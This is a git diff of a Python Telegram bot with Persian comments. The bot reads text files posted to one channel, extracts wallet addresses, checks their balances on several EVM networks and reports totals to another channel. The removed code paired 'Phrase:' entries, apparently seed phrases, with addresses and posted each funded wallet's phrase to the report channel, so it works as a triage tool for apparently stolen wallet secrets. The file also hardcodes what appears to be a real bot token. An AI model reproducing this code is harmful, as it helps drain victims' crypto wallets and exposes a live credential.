@@ -1,15 +1,19 @@
 import os
 import re
 import asyncio
+import logging
 from telegram import Update
 from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters
 from web3 import Web3
 from keep_alive import keep_alive
 
-# --- تنظیمات دقیق ---
+# تنظیمات لاگ برای دیدن خطاها در کنسول
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+
+# --- تنظیمات ---
 BOT_TOKEN = '8668017334:AAHMHyPg_LAlYtzlcggKGhBjbGHXNLspylk'
-SOURCE_CHANNEL = '@rrxfq'           # کانالی که فایل‌ها در آن آپلود می‌شوند
-REPORT_CHANNEL_ID = '@regroupmywallet' # کانالی که گزارش‌ها به آن ارسال می‌شوند
+SOURCE_CHANNEL = 'rrxfq' # بدون @ برای مقایسه راحت‌تر
+REPORT_CHANNEL_ID = '@regroupmywallet'
 
 NETWORKS = {
     'ETH': 'https://eth.llamarpc.com',
@@ -23,82 +27,82 @@ def check_all_balances(address):
     results = {}
     for name, rpc in NETWORKS.items():
         try:
-            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 7}))
+            # ایجاد اتصال جدید برای هر درخواست جهت جلوگیری از بلاک شدن
+            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 10}))
             checksum_addr = Web3.to_checksum_address(address.strip())
             bal_wei = w3.eth.get_balance(checksum_addr)
-            amount = float(w3.from_wei(bal_wei, 'ether'))
-            results[name] = amount
-        except:
+            results[name] = float(w3.from_wei(bal_wei, 'ether'))
+        except Exception as e:
+            logging.error(f"Error checking {name} for {address}: {e}")
             results[name] = 0.0
     return results
 
 async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # بررسی اینکه فایل حتماً از کانال سورس آمده باشد
-    if update.channel_post.chat.username != SOURCE_CHANNEL.replace('@', ''):
+    # لاگ کردن برای تست: آیا پیامی دریافت شد؟
+    logging.info("A new post detected in a channel...")
+
+    if not update.channel_post:
+        return
+
+    # بررسی یوزرنیم کانال (حساس نبودن به بزرگ و کوچکی حروف)
+    current_chat = update.channel_post.chat
+    if not current_chat.username or current_chat.username.lower() != SOURCE_CHANNEL.lower():
+        logging.info(f"Message ignored from: {current_chat.username}")
         return
 
     doc = update.channel_post.document
-    if not doc or not doc.file_name.endswith('.txt'):
+    if not doc:
+        logging.info("Post has no document.")
         return
 
-    # ارسال پیام شروع پردازش در کانال گزارش
-    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"📥 فایل جدید در `{SOURCE_CHANNEL}` یافت شد.\n📄 نام فایل: `{doc.file_name}`\n⏳ در حال محاسبه موجودی کل...")
+    logging.info(f"Processing file: {doc.file_name}")
 
     try:
+        # اطلاع‌رسانی اولیه در کانال ریپورت
+        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"📥 دریافت فایل `{doc.file_name}` از سورس. در حال محاسبه...")
+
         file = await context.bot.get_file(doc.file_id)
         content_bytes = await file.download_as_bytearray()
         content = content_bytes.decode('utf-8', errors='ignore')
 
-        addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)
-        phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
-        wallets = list(zip(phrases, addresses))
-
-        if not wallets:
-            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ در فایل `{doc.file_name}` آدرسی پیدا نشد.")
+        addresses = re.findall(r"0x[a-fA-F0-9]{40}", content)
+        
+        # اگر آدرسی پیدا نشد، باز هم گزارش بده
+        if not addresses:
+            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"⚠️ فایل `{doc.file_name}` اسکن شد اما هیچ آدرس ولتی (0x...) در آن یافت نشد.")
             return
 
         total_summary = {net: 0.0 for net in NETWORKS.keys()}
-        rich_details = ""
         
-        for phrase, addr in wallets:
+        # پیمایش آدرس‌ها و جمع زدن موجودی
+        for addr in set(addresses): # استفاده از set برای حذف آدرس‌های تکراری در یک فایل
             balances = check_all_balances(addr)
-            has_money = False
-            wallet_info = f"\n💎 **Rich Wallet:**\n🔑 `{phrase.strip()}`\n📍 `{addr}`\n"
-            
             for net, amount in balances.items():
                 total_summary[net] += amount
-                if amount > 0:
-                    has_money = True
-                    wallet_info += f"   - {net}: `{amount:.6f}`\n"
-            
-            if has_money:
-                rich_details += wallet_info
 
         # ساخت گزارش نهایی
-        report = f"📊 **گزارش نهایی فایل:** `{doc.file_name}`\n"
-        report += f"📁 منبع: {SOURCE_CHANNEL}\n"
-        report += f"🔢 تعداد کل ولت‌ها: {len(wallets)}\n"
+        report = f"📋 **گزارش موجودی کل فایل**\n"
+        report += f"📄 نام فایل: `{doc.file_name}`\n"
+        report += f"🔢 تعداد آدرس‌ها: {len(addresses)}\n"
         report += "──────────────────\n"
-        report += "💰 **مجموع موجودی این فایل:**\n"
         for net, total in total_summary.items():
-            report += f"   - {net}: `{total:.6f}`\n"
+            report += f"🔹 {net}: `{total:.6f}`\n"
+        report += "──────────────────"
 
         await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=report, parse_mode='Markdown')
-
-        if rich_details:
-            # ارسال جزئیات ولت‌های پول‌دار
-            for i in range(0, len(rich_details), 4000):
-                await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details[i:i+4000], parse_mode='Markdown')
+        logging.info("Report sent successfully.")
 
     except Exception as e:
-        print(f"Error: {e}")
+        logging.error(f"General error: {e}")
+        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ خطا در پردازش فایل `{doc.file_name}`: {e}")
 
 if __name__ == '__main__':
     keep_alive()
+    # استفاده از تنظیمات برای اطمینان از دریافت پست‌های کانال
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     
-    # فیلتر کردن پیام‌ها: فقط پست‌های کانال که فایل (Document) دارند
-    channel_filter = filters.ChatType.CHANNEL & filters.Document.ALL
-    application.add_handler(MessageHandler(channel_filter, process_report_file))
+    # هندلر بدون فیلتر سختگیرانه برای تست اولیه
+    application.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.CHANNEL, process_report_file))
     
-    application.run_polling()
+    logging.info("Bot started. Listening for channel posts...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
